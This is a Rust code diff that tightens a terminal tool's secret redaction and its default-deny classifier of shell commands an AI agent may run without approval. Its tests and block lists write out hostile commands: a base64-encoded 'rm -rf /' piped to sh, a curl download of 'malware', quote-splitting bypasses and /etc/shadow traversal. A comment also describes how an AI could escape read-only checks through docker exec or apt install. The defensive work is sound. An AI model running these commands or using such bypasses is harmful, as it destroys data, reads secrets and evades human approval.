@@ -44,20 +44,57 @@ pub(crate) fn sanitize(text: &str) -> String {
                 template: "${1}${2}***'",
             },
             Rule {
+                // 不设最短长度：短口令同样是秘密；宁可多打码
                 re: Regex::new(
-                    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key)(\s*[:=]\s*)[^\s"',;]{6,}"#,
+                    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key)(\s*[:=]\s*)[^\s"',;]+"#,
                 )
                 .unwrap(),
                 template: "${1}${2}***",
+            },
+            // CLI 常见写法：mysql -pSecret / ssh -p22 / --password Secret
+            Rule {
+                re: Regex::new(r#"(?i)(\s-p)([^\s"',;]{2,})"#).unwrap(),
+                template: "${1}***",
+            },
+            Rule {
+                re: Regex::new(r#"(?i)(--password)(\s+|=)([^\s"',;]+)"#).unwrap(),
+                template: "${1}${2}***",
+            },
+            // URL 中携带的用户名/口令：postgres://user:pass@host
+            Rule {
+                re: Regex::new(r#"(?i)([a-z][a-z0-9+.-]*://)([^/\s:@]+):([^@\s/]+)@"#).unwrap(),
+                template: "${1}***:***@",
+            },
+            // curl -u user:password
+            Rule {
+                re: Regex::new(r#"(?i)(\s-u\s+)([^:\s]+):([^\s]+)"#).unwrap(),
+                template: "${1}***:***",
             },
             // AWS Access Key
             Rule {
                 re: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
                 template: "***",
             },
-            // OpenAI / DeepSeek 风格 sk- 密钥（大小写不敏感）
+            // OpenAI / DeepSeek / Stripe 风格 sk- 密钥（大小写不敏感）
             Rule {
                 re: Regex::new(r"(?i)sk-[A-Za-z0-9_\-]{16,}").unwrap(),
+                template: "***",
+            },
+            Rule {
+                re: Regex::new(r"(?i)sk_(live|test)_[A-Za-z0-9]{16,}").unwrap(),
+                template: "***",
+            },
+            // GitHub / Slack / Google 常见 token
+            Rule {
+                re: Regex::new(r"\bgh[pousr]_[A-Za-z0-9]{20,}\b").unwrap(),
+                template: "***",
+            },
+            Rule {
+                re: Regex::new(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b").unwrap(),
+                template: "***",
+            },
+            Rule {
+                re: Regex::new(r"\bAIza[0-9A-Za-z_\-]{20,}\b").unwrap(),
                 template: "***",
             },
             // PEM 私钥块
@@ -95,8 +132,8 @@ pub(crate) fn sanitize(text: &str) -> String {
 }
 
 /// 命令风险分级：Write（修改状态，通常可恢复）< Dangerous（破坏性 / 不可逆 / 影响服务可用性）。
-/// `is_dangerous` 与 `is_write_operation` 全部从这张表派生判断，避免同一动作在多处分别
-/// 维护子串列表导致行为漂移（例如 `kill -9` 在一处是 Dangerous，在另一处却漏判）。
+/// `is_dangerous` 从这张表派生；`is_write_operation` 已改为默认拒绝的安全白名单判定，
+/// 不再依赖本表是否收录某个命令。这样 `awk`、`sed`、`r''m` 之类的绕过不会因漏配而自动执行。
 #[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
 enum RiskTier {
     Write,
@@ -136,6 +173,15 @@ const COMMAND_RULES: &[(&str, RiskTier)] = &[
     ("truncate table", RiskTier::Dangerous),
     ("delete from", RiskTier::Dangerous),
     ("kill -9", RiskTier::Dangerous),
+    // 这些命令同样具有破坏性，但以前没有收录；新增后至少能在审计/审批原因
+    // 与修复步骤风险标记里显示为 Dangerous。
+    ("unlink ", RiskTier::Dangerous),
+    ("shred", RiskTier::Dangerous),
+    ("truncate -s", RiskTier::Dangerous),
+    ("wipefs", RiskTier::Dangerous),
+    ("systemd-run", RiskTier::Dangerous),
+    ("nsenter", RiskTier::Dangerous),
+    ("chroot", RiskTier::Dangerous),
 
     // ---- Write：修改状态但通常可恢复 ----
     ("touch ", RiskTier::Write),
@@ -256,124 +302,402 @@ pub(crate) fn is_dangerous(command: &str) -> bool {
     max_tier(command) == Some(RiskTier::Dangerous)
 }
 
-/// 判断重定向是否构成真实写操作（排除 /dev/null 丢弃、fd 复制等无害写法）。
-fn has_unsafe_redirect(command: &str) -> bool {
-    let c = command.to_ascii_lowercase();
-    let cleaned = c
-        .replace("2>/dev/null", "")
-        .replace(">/dev/null", "")
-        .replace("1>/dev/null", "")
-        .replace("2>&1", "")
-        .replace(">&2", "")
-        .replace(">&1", "")
-        .replace("2>&-", "");
-    cleaned.contains('>')
-}
-
-/// 管道是否交给 shell 解释器执行（下载即执行 / base64 解码后执行等编码绕过）。
-/// 词边界判断避免误伤 `cat x | shasum` 这类名字以 sh 开头的普通工具。
-fn has_pipe_to_shell(command: &str) -> bool {
-    static RE: OnceLock<Regex> = OnceLock::new();
-    let re = RE.get_or_init(|| {
-        Regex::new(r#"\|\s*(sh|bash|zsh|dash)(\s|;|$)"#).unwrap()
-    });
-    re.is_match(&command.to_ascii_lowercase())
-}
-
-/// 只读模式下判断命令是否包含写操作（修改 / 删除 / 安装 / 网络传输 / 重定向写文件等）。
-/// 用于 MCP 只读权限模式：该场景 exec_command 是任意 shell，docker/systemctl/apt 等
-/// 一律整体拦截（宁可多拦），因此直接复用统一规则表的整体匹配粒度。
-pub(crate) fn is_write_operation(command: &str) -> bool {
-    if max_tier(command).is_some() {
-        return true;
+/// 检查引号外的 shell 元字符。单引号内一切都是字面量；双引号内仍拒绝
+/// `$`、反引号和反斜杠（它们在双引号里仍会展开）。这样 `grep -E 'a|b'`
+/// 这类常见只读命令可以自动执行，而 `cat a | sh` 仍会被拒绝。
+fn has_unsafe_shell_syntax(command: &str) -> bool {
+    let mut quote: Option<char> = None;
+    for ch in command.chars() {
+        match quote {
+            Some(q) => {
+                if ch == q {
+                    quote = None;
+                } else if q == '"' && matches!(ch, '$' | '`' | '\\') {
+                    return true;
+                }
+            }
+            None => match ch {
+                '\'' | '"' => quote = Some(ch),
+                ';' | '|' | '&' | '$' | '`' | '>' | '<' | '(' | ')' | '{' | '}' | '\\'
+                | '*' | '?' | '[' | ']' | '\n' | '\r' => return true,
+                _ => {}
+            },
+        }
     }
-    has_unsafe_redirect(command) || has_pipe_to_shell(command)
+    quote.is_some()
 }
 
-/// 巡检白名单场景下，`ALLOWED` 里部分工具（docker/systemctl/apt/ufw/firewall-cmd 等）本意
-/// 只放行其只读查询子命令（如 `docker ps`、`systemctl status`），但 `is_write_operation`
-/// 对这些工具是整体拦截粒度，不能直接复用。这里单独列出这些工具中真正有破坏性/绕过只读
-/// 意图的子命令，做精确拦截，而不是拦截整个工具。
-///
-/// 这里同时修复了旧版 `validate_readonly_command` 的一个安全缺口：旧版只按“首个词是否在白名单”
-/// 做粗粒度判断，`docker exec`、`apt install` 等子命令未被拦截，AI 可借助已放行的工具名逃出
-/// “只读检查”的意图（例如 `docker exec -it web bash` 或 `apt install netcat`）。
-const READONLY_EXTRA_FORBIDDEN: &[&str] = &[
-    "docker exec", "docker run", "docker rm", "docker rmi", "docker stop", "docker kill",
-    "docker restart", "docker build", "docker push", "docker pause", "docker unpause",
-    "docker compose", "docker-compose",
-    "podman exec", "podman run", "podman rm", "podman rmi", "podman stop", "podman kill",
-    "podman restart",
-    "apt install", "apt remove", "apt purge", "apt update", "apt upgrade", "apt autoremove",
-    "apt-get install", "apt-get remove", "apt-get purge", "apt-get update", "apt-get upgrade",
-    "apt-get autoremove",
-    "yum install", "yum remove", "yum erase", "yum update", "yum upgrade",
-    "dnf install", "dnf remove", "dnf update", "dnf upgrade",
-    "zypper install", "zypper remove", "zypper update",
-    "pacman -s", "pacman -r", "pacman -u",
-    "dpkg -i", "dpkg -r", "dpkg --purge",
-    "rpm -i", "rpm -e", "rpm -u",
-    "systemctl start", "systemctl stop", "systemctl restart", "systemctl enable",
-    "systemctl disable", "systemctl mask", "systemctl unmask", "systemctl reload",
-    "systemctl try-restart", "systemctl daemon-reload", "systemctl kill",
-    "systemctl set-default", "systemctl rescue", "systemctl emergency",
-    "systemctl halt", "systemctl reboot", "systemctl poweroff", "systemctl isolate",
-    "ufw allow", "ufw deny", "ufw reject", "ufw limit", "ufw insert", "ufw delete",
-    "ufw enable", "ufw disable", "ufw reset",
-    "firewall-cmd --add", "firewall-cmd --remove", "firewall-cmd --reload",
-    // 解释器直接执行代码 / 编辑类写操作（env 已移出白名单，这里兜底解释器入口）
-    "python3 -c", "python -c", "python2 -c", "perl -e", "ruby -e", "node -e", "php -r",
-    "sed -i", "perl -i", "awk -i",
-    // find 的破坏性动作
-    " -delete", " -exec",
-];
+/// 取第一个不以 `-` 开头的参数（用于工具子命令判断）。
+fn first_non_flag(tokens: &[String]) -> Option<&str> {
+    tokens
+        .iter()
+        .map(String::as_str)
+        .find(|token| !token.starts_with('-'))
+}
 
-/// 巡检动态命令白名单校验：只允许白名单内的只读命令，拒绝管道/重定向/命令替换/写操作。
+/// 判断命令是否可以 **自动执行** 的只读命令。
+///
+/// 这里采用默认拒绝：只有首词在安全白名单、子命令/参数满足约束，且引号外
+/// 不含 shell 元字符时才返回 true。任何无法确定语义的写法都返回 false，
+/// 由审批层交给用户确认。
+///
+/// 这是安全边界，不是“猜写操作”的启发式：`r''m -rf /`、`bash -c 'unlink x'`、
+/// `awk 'BEGIN{system(...)}'`、`sed 'w file'` 等都不会被自动放行。
+pub(crate) fn is_safe_readonly_command(command: &str) -> bool {
+    let c = command.trim();
+    if c.is_empty() || c.len() > 16_384 {
+        return false;
+    }
+    if has_unsafe_shell_syntax(c) || c.contains("..") {
+        return false;
+    }
+    let tokens: Vec<&str> = c.split_whitespace().collect();
+    let Some(first_raw) = tokens.first().copied() else {
+        return false;
+    };
+    // 首词必须是裸命令名：带路径、引号或转义都可能改变实际执行的程序。
+    if first_raw.contains('/') || first_raw.contains('"') || first_raw.contains('\'') {
+        return false;
+    }
+    let first = first_raw.to_ascii_lowercase();
+    let lower: Vec<String> = tokens.iter().map(|token| token.to_ascii_lowercase()).collect();
+
+    match first.as_str() {
+        // 纯读取 / 输出过滤类命令
+        "cat" | "head" | "tail" | "grep" | "egrep" | "fgrep" | "ls" | "stat" | "df"
+        | "du" | "free" | "uptime" | "uname" | "id" | "whoami" | "pwd" | "locale"
+        | "last" | "lastb" | "who" | "w" | "getent" | "ps" | "netstat" | "lsof"
+        | "echo" | "printf" | "true" | "false" | "wc" | "cut" | "tr" | "nl"
+        | "column" | "sha256sum" | "sha1sum" | "md5sum" => true,
+
+        // 有写模式的读取工具：只放行明确的只读形式
+        "hostname" => lower.iter().skip(1).all(|token| {
+            matches!(
+                token.as_str(),
+                "-f"
+                    | "-s"
+                    | "-d"
+                    | "-i"
+                    | "--fqdn"
+                    | "--short"
+                    | "--domain"
+                    | "--ip-address"
+                    | "--all-ip-addresses"
+                    | "--version"
+            )
+        }),
+        "date" => !lower.iter().skip(1).any(|token| {
+            token.starts_with("-s")
+                || token.starts_with("--set")
+                || (!token.starts_with('-') && !token.starts_with('+'))
+        }),
+        "sysctl" => {
+            !lower.iter().any(|token| {
+                token.starts_with("-w")
+                    || token.starts_with("--write")
+                    || token.starts_with("-p")
+                    || token.starts_with("--load")
+                    || token.starts_with("--system")
+                    || token.contains('=')
+            })
+        }
+
+        "ss" => !lower
+            .iter()
+            .any(|token| token.starts_with("-k") || token.starts_with("--kill")),
+
+        "journalctl" => !lower.iter().any(|token| {
+            token.starts_with("--vacuum")
+                || token.starts_with("--rotate")
+                || token.starts_with("--flush")
+                || token.starts_with("--sync")
+                || token.starts_with("--setup-keys")
+                || token.starts_with("--update-catalog")
+                || token.starts_with("--relinquish-var")
+                || token.starts_with("--smart-relinquish-var")
+        }),
+
+        "systemctl" => first_non_flag(&lower[1..]).is_some_and(|command| {
+            matches!(
+                command,
+                "status"
+                    | "show"
+                    | "list-units"
+                    | "list-unit-files"
+                    | "list-timers"
+                    | "list-sockets"
+                    | "list-dependencies"
+                    | "get-default"
+                    | "is-active"
+                    | "is-enabled"
+                    | "is-failed"
+                    | "cat"
+                    | "help"
+            )
+        }),
+
+        "docker" | "podman" => match first_non_flag(&lower[1..]) {
+            Some("system") => first_non_flag(&lower[2..]).is_some_and(|command| command == "df"),
+            Some(command) => matches!(
+                command,
+                "ps"
+                    | "inspect"
+                    | "logs"
+                    | "stats"
+                    | "images"
+                    | "version"
+                    | "info"
+                    | "top"
+                    | "port"
+                    | "diff"
+                    | "history"
+                    | "events"
+                    | "search"
+            ),
+            None => false,
+        },
+
+        "apt" => first_non_flag(&lower[1..]).is_some_and(|command| command == "list"),
+        "yum" | "dnf" => first_non_flag(&lower[1..]).is_some_and(|command| {
+            matches!(
+                command,
+                "list" | "info" | "search" | "check-update" | "repolist" | "deplist"
+            )
+        }),
+        "zypper" => first_non_flag(&lower[1..]).is_some_and(|command| {
+            matches!(
+                command,
+                "search" | "info" | "list-updates" | "repos" | "packages" | "patterns"
+            )
+        }),
+        "brew" => first_non_flag(&lower[1..]).is_some_and(|command| {
+            matches!(command, "list" | "info" | "search" | "outdated")
+        }),
+
+        "rpm" => {
+            let write = lower.iter().any(|token| {
+                token.starts_with("-i")
+                    || token.starts_with("-e")
+                    || token.starts_with("-u")
+                    || token.starts_with("-f")
+                    || token == "--install"
+                    || token == "--erase"
+                    || token == "--upgrade"
+                    || token == "--freshen"
+            });
+            let query = lower.iter().any(|token| {
+                token.starts_with("-q") || token == "--query"
+            });
+            query && !write
+        }
+
+        "dpkg" => {
+            let write = lower.iter().any(|token| {
+                matches!(
+                    token.as_str(),
+                    "-i"
+                        | "-r"
+                        | "-p"
+                        | "--install"
+                        | "--remove"
+                        | "--purge"
+                        | "--configure"
+                        | "--unpack"
+                )
+            });
+            let query = lower.iter().any(|token| {
+                matches!(
+                    token.as_str(),
+                    "-l" | "-L" | "-s" | "-S" | "--list" | "--status" | "--search" | "--print-avail"
+                )
+            });
+            query && !write
+        }
+
+        "sshd" => lower.iter().any(|token| token == "-t"),
+        "ufw" => first_non_flag(&lower[1..]).is_some_and(|command| matches!(command, "status" | "show")),
+        "firewall-cmd" => {
+            let write = lower.iter().any(|token| {
+                token.starts_with("--add")
+                    || token.starts_with("--remove")
+                    || token.starts_with("--delete")
+                    || token.starts_with("--set")
+                    || token == "--reload"
+                    || token == "--complete-reload"
+                    || token == "--panic-on"
+                    || token == "--panic-off"
+            });
+            let read = lower.iter().any(|token| {
+                matches!(
+                    token.as_str(),
+                    "--state"
+                        | "--list-all"
+                        | "--list-services"
+                        | "--list-ports"
+                        | "--list-protocols"
+                        | "--get-zones"
+                        | "--get-default-zone"
+                        | "--get-active-zones"
+                        | "--info-zone"
+                        | "--info-service"
+                ) || token.starts_with("--query-")
+            });
+            read && !write
+        }
+        "fail2ban-client" => {
+            first_non_flag(&lower[1..]).is_some_and(|command| command == "status")
+        }
+
+        "hostnamectl" => first_non_flag(&lower[1..]).is_none_or(|command| {
+            matches!(command, "status" | "show")
+        }),
+        "timedatectl" => first_non_flag(&lower[1..]).is_none_or(|command| {
+            matches!(
+                command,
+                "status" | "show" | "list-timezones" | "timesync-status" | "show-timesync"
+            )
+        }),
+        "ip" => {
+            const WRITE: &[&str] = &[
+                "add", "del", "delete", "set", "flush", "change", "replace", "up", "down",
+                "save", "restore", "append", "prepend", "update", "exec", "attach",
+            ];
+            const READ: &[&str] = &[
+                "addr", "a", "route", "r", "link", "l", "neigh", "n", "maddr", "mroute",
+                "rule", "tunnel", "tuntap", "netns",
+            ];
+            // `ip netns exec <ns> <command>` 会执行任意命令，必须按写操作处理。
+            !lower.iter().any(|token| WRITE.contains(&token.as_str()))
+                && lower.iter().any(|token| READ.contains(&token.as_str()))
+        }
+
+        // 解释器、脚本执行器、编辑器、网络传输、包安装等一律不自动执行
+        _ => false,
+    }
+}
+
+/// 默认拒绝的写操作判定：只要不能证明是安全只读命令，就视为需要审批。
+/// 名称保留是为了兼容现有调用方；语义已从“命中危险词表”升级为“非安全白名单”。
+pub(crate) fn is_write_operation(command: &str) -> bool {
+    !is_safe_readonly_command(command)
+}
+
+/// 敏感路径判定：命中时读取/执行需要用户确认（SFTP 编辑器与 AI 工具共用）。
+pub(crate) fn is_sensitive_path(path: &str) -> bool {
+    // 去掉 shell 引号后再匹配：/etc/sh''adow 与 /etc/shadow 是同一个目标。
+    let raw = path
+        .replace('\\', "/")
+        .replace('\'', "")
+        .replace('"', "")
+        .to_ascii_lowercase();
+    // 文本归一化 .. / .，避免 /etc/../etc/shadow 绕过标记匹配。
+    // 这里只做路径语义归一化；符号链接目标由 SFTP 层另行解析。
+    let mut parts: Vec<&str> = Vec::new();
+    for part in raw.split('/') {
+        match part {
+            "" | "." => {}
+            ".." => {
+                parts.pop();
+            }
+            other => parts.push(other),
+        }
+    }
+    let p = format!("/{}", parts.join("/"));
+    const MARKERS: &[&str] = &[
+        "/.ssh/",
+        ".ssh/",
+        "/.aws/",
+        ".aws/",
+        "/.azure/",
+        ".azure/",
+        "/.gnupg/",
+        ".gnupg/",
+        "/.kube/",
+        ".kube/",
+        "/.docker/config.json",
+        ".docker/config.json",
+        "/.pgpass",
+        ".pgpass",
+        "/.my.cnf",
+        ".my.cnf",
+        "/.netrc",
+        ".netrc",
+        "/.git-credentials",
+        ".git-credentials",
+        "/.bash_history",
+        ".bash_history",
+        "/.zsh_history",
+        ".zsh_history",
+        "/.mysql_history",
+        ".mysql_history",
+        "/.psql_history",
+        ".psql_history",
+        "/etc/environment",
+        "/proc/self/environ",
+        "/proc/1/environ",
+        "/.config/gcloud/",
+        ".config/gcloud/",
+        "/.config/gh/",
+        ".config/gh/",
+        "/.npmrc",
+        ".npmrc",
+        "/.pypirc",
+        ".pypirc",
+        "id_rsa",
+        "id_ed25519",
+        "id_ecdsa",
+        "id_dsa",
+        "/etc/shadow",
+        "/etc/gshadow",
+        "/etc/passwd",
+        "/etc/group",
+        "/etc/sudoers",
+        "/etc/pam.d/",
+        "/etc/ld.so.preload",
+        "/etc/ssh/",
+        "/etc/ssl/private/",
+        "/etc/krb5.keytab",
+        "/etc/crontab",
+        "/etc/cron.",
+        "/var/spool/cron",
+        "/etc/systemd/",
+        "/etc/init.d/",
+        "/etc/rc.local",
+        "/etc/profile.d/",
+        "/.bashrc",
+        ".bashrc",
+        "/.bash_profile",
+        ".bash_profile",
+        "/.profile",
+        ".profile",
+        "/.zshrc",
+        ".zshrc",
+        "/.zprofile",
+        ".zprofile",
+        "/.config/fish/",
+        ".config/fish/",
+    ];
+    MARKERS.iter().any(|marker| p.contains(marker))
+}
+
+/// 命令字符串里是否出现敏感路径（用于 AI/MCP 执行前加一道审批）。
+pub(crate) fn command_has_sensitive_path(command: &str) -> bool {
+    is_sensitive_path(command)
+}
+
+/// 巡检动态命令白名单校验：只允许可证明安全的只读命令。
+/// 与 MCP 只读/Agent 智能审核共用同一个默认拒绝分类器，避免三处规则漂移。
 pub(crate) fn validate_readonly_command(command: &str) -> Result<(), String> {
     let c = command.trim();
     if c.is_empty() || c.chars().count() > 500 {
         return Err(crate::i18n::t("命令为空或过长", "The command is empty or too long").to_string());
     }
-    const META_CHARS: &[&str] = &[";", "&&", "||", "|", ">", ">>", "<", "<<", "$(", "`", "\n", "\r"];
-    for token in META_CHARS {
-        if c.contains(token) {
-            return Err(format!("{}: {token}", crate::i18n::t("包含不允许的字符", "Contains a disallowed character")));
-        }
-    }
-    let lower = c.to_ascii_lowercase();
-    if is_dangerous(&lower) {
-        return Err(crate::i18n::t("命令属于高危操作，只读巡检不允许执行", "The command is a high-risk operation and is not allowed in read-only inspection").to_string());
-    }
-    // 基础写操作动词：不依赖工具白名单，任何情况下都拦截
-    const BASIC_WRITE: &[&str] = &[
-        "rm ", "mv ", "cp ", "touch ", "mkdir ", "chmod", "chown", "mount ", "umount",
-    ];
-    for token in BASIC_WRITE {
-        if lower.contains(token) {
-            return Err(format!("{}: {token}", crate::i18n::t("包含不允许的操作", "Contains a disallowed operation")));
-        }
-    }
-    for token in READONLY_EXTRA_FORBIDDEN {
-        if lower.contains(token) {
-            return Err(format!("{}: {token}", crate::i18n::t("包含不允许的操作", "Contains a disallowed operation")));
-        }
-    }
-    let first = c
-        .split_whitespace()
-        .next()
-        .unwrap_or("")
-        .rsplit('/')
-        .next()
-        .unwrap_or("");
-    const ALLOWED: &[&str] = &[
-        "cat", "grep", "head", "tail", "awk", "sed", "find", "ls", "ps", "df", "du", "free",
-        "uptime", "uname", "hostname", "ss", "netstat", "systemctl", "journalctl", "docker",
-        "podman", "sshd", "ufw", "firewall-cmd", "fail2ban-client", "last", "lastb", "who",
-        "w", "id", "getent", "stat", "lsof", "sysctl", "hostnamectl", "timedatectl", "rpm",
-        "dpkg", "apt", "yum", "dnf", "zypper", "pacman", "brew", "locale",
-    ];
-    if !ALLOWED.contains(&first) {
-        return Err(format!("{}: {first}", crate::i18n::t("命令不在只读白名单内", "The command is not in the read-only allowlist")));
+    if !is_safe_readonly_command(c) {
+        return Err(crate::i18n::t(
+            "命令不在只读白名单内或包含不允许的 shell 语法",
+            "The command is not in the read-only allowlist or contains disallowed shell syntax",
+        )
+        .to_string());
     }
     Ok(())
 }
@@ -408,7 +732,19 @@ mod tests {
         assert_eq!(sanitize("token = 'abc123def456'"), "token = '***'");
         assert_eq!(sanitize("Sk-abcdefghijklmnopqrst"), "***");
         assert_eq!(sanitize(r#"Authorization: Bearer "eyJhbGciOiJIUzI1NiJ9""#), "***");
-        assert_eq!(sanitize("password=short"), "password=short", "过短值不匹配（避免误伤）");
+        assert_eq!(sanitize("password=short"), "password=***", "短口令也必须脱敏");
+    }
+
+    #[test]
+    fn sanitize_redacts_cli_and_url_credentials() {
+        assert_eq!(sanitize("mysql -uroot -pS3cret"), "mysql -uroot -p***");
+        assert_eq!(sanitize("mysql --password S3cret"), "mysql --password ***");
+        assert_eq!(
+            sanitize("psql postgres://user:pass@db.local/app"),
+            "psql postgres://***:***@db.local/app"
+        );
+        assert_eq!(sanitize("curl -u user:pass https://x"), "curl -u ***:*** https://x");
+        assert_eq!(sanitize("token ghp_abcdefghijklmnopqrstuvwxyz012345"), "token ***");
     }
 
     #[test]
@@ -435,7 +771,9 @@ mod tests {
         assert!(is_write_operation("echo 'cm0gLXJmIC8K' | base64 -d | sh"));
         assert!(is_write_operation("echo hi | bash"));
         assert!(is_write_operation("cat x | zsh"));
-        assert!(!is_write_operation("cat x | shasum"), "| shasum 不应误判为管道 shell");
+        // 默认拒绝策略下，管道本身就是 shell 组合语法；即使目标是 shasum，
+        // 也要求用户确认一次，而不是自动执行。
+        assert!(is_write_operation("cat x | shasum"));
         assert!(is_write_operation("python3 -c \"open('/tmp/x','w').write('x')\""));
         assert!(is_write_operation("perl -e 'print 1'"));
         assert!(is_write_operation("curl -Lo /tmp/malware http://x"));
@@ -490,13 +828,80 @@ mod tests {
         assert!(validate_readonly_command("find / -exec rm {} \\;").is_err());
     }
 
-    /// is_dangerous / is_write_operation 统一从同一张风险表派生，验证 Dangerous 蕴含 Write。
     #[test]
-    fn dangerous_implies_write_operation() {
-        for cmd in ["rm -rf /", "mkfs /dev/sda1", "shutdown -h now", "iptables -F"] {
-            assert!(is_dangerous(cmd), "{cmd} 应判定为 dangerous");
-            assert!(is_write_operation(cmd), "{cmd} 应判定为 write_operation");
+    fn rejects_shell_quote_and_interpreter_bypasses() {
+        for cmd in [
+            "r''m -rf /",
+            "\"r\"m -rf /",
+            "bash -c 'unlink /tmp/buffterm_bypass_check'",
+            "sh -c 'shred -u /tmp/buffterm_bypass_check'",
+            "awk 'BEGIN{system(\"unlink /tmp/buffterm_bypass_check\")}'",
+            "sed -n 'w /tmp/buffterm_bypass_check' somefile",
+            "unlink /tmp/buffterm_bypass_check",
+            "truncate -s 0 /tmp/buffterm_bypass_check",
+            "shred -u /tmp/buffterm_bypass_check",
+            "cat /etc/sh*",
+            "cat /etc/../etc/shadow",
+            "ip netns exec prod sh -c 'unlink /tmp/x'",
+        ] {
+            assert!(!is_safe_readonly_command(cmd), "{cmd} 不应被当成只读");
+            assert!(is_write_operation(cmd), "{cmd} 应要求审批");
+            assert!(validate_readonly_command(cmd).is_err(), "{cmd} 应被巡检拒绝");
         }
+    }
+
+    #[test]
+    fn safe_allowlist_keeps_common_readonly_queries() {
+        for cmd in [
+            "cat /etc/hosts",
+            "grep -n error /var/log/syslog",
+            "df -h",
+            "ps aux",
+            "systemctl status nginx",
+            "docker ps",
+            "apt list --upgradable",
+            "ss -lntp",
+            "ip addr show",
+            "journalctl -n 50",
+            "date +%s",
+            "hostname -f",
+            "grep -E 'error|warn' /var/log/syslog",
+            "grep -E \"error|warn\" /var/log/syslog",
+        ] {
+            assert!(is_safe_readonly_command(cmd), "{cmd} 应视为安全只读");
+            assert!(!is_write_operation(cmd), "{cmd} 不应要求审批");
+        }
+        for cmd in [
+            "hostname new-name",
+            "hostname --file=/etc/hostname",
+            "date -s '2026-01-01 00:00:00'",
+            "date --set='2026-01-01 00:00:00'",
+            "sysctl -p /etc/sysctl.conf",
+            "sysctl -p/etc/sysctl.conf",
+            "brew install wget",
+        ] {
+            assert!(!is_safe_readonly_command(cmd), "{cmd} 有写入副作用");
+        }
+    }
+
+    #[test]
+    fn sensitive_paths_are_flagged() {
+        for path in [
+            "/root/.ssh/id_rsa",
+            ".ssh/id_ed25519",
+            "/etc/shadow",
+            "/etc/sudoers",
+            "/home/app/.kube/config",
+            "/home/app/.pgpass",
+        ] {
+            assert!(is_sensitive_path(path), "{path} 应判定为敏感路径");
+        }
+        assert!(!is_sensitive_path("/var/log/syslog"));
+        assert!(is_sensitive_path("/etc/../etc/shadow"), "路径穿越应归一化后命中");
+        assert!(is_sensitive_path("/etc/sh''adow"), "引号拼接应归一化后命中");
+        assert!(command_has_sensitive_path("cat /etc/shadow"));
+        assert!(command_has_sensitive_path("cat /etc/sh''adow"));
+        assert!(!command_has_sensitive_path("df -h"));
     }
 
     #[test]
